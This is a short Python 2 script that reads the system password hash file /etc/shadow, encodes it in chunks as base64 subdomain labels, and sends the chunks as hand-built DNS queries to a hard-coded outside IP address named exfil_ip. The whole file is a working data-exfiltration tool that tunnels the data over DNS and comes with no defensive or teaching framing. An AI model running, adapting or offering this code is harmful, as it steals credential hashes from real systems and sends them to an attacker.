#!/usr/bin/env python
# python2. update later.
import base64
import socket
from time import sleep

filename = "/etc/shadow"
exfil_ip = "200.200.215.24"

def make_packet(domain):

    # hard coded data
    # -----------------
    # transaction_id = 0xdead
    # flags = 0x0100
    # question_count = 0x0001
    # unused = 0x0000 0x0000 0x0000
    header = "\xde\xad\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"

    # record_type = 0x0001 # 1 = A record
    # network_type = 0x0001 # 1 is INET? idk. it works.
    footer = "\x00\x00\x01\x00\x01"

    x = ''.join((chr(len(s))+s for s in domain.split('.')))

    return header + x + footer

def domains_from_file(filename):
    with open(filename, 'r') as f:
        bytes = f.read(40)
        while bytes != '':
            domain = base64.urlsafe_b64encode(bytes).rstrip('=')
            yield domain + '.com'
            bytes = f.read(40)

    # signal EOF
    yield 'google.com'

def send_query(query, ip=exfil_ip, port=53):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(query, (ip, port))


if __name__ == "__main__":
    for i in domains_from_file(filename):
        query = make_packet(i)
        send_query(query)
        print i
        time.sleep(1)
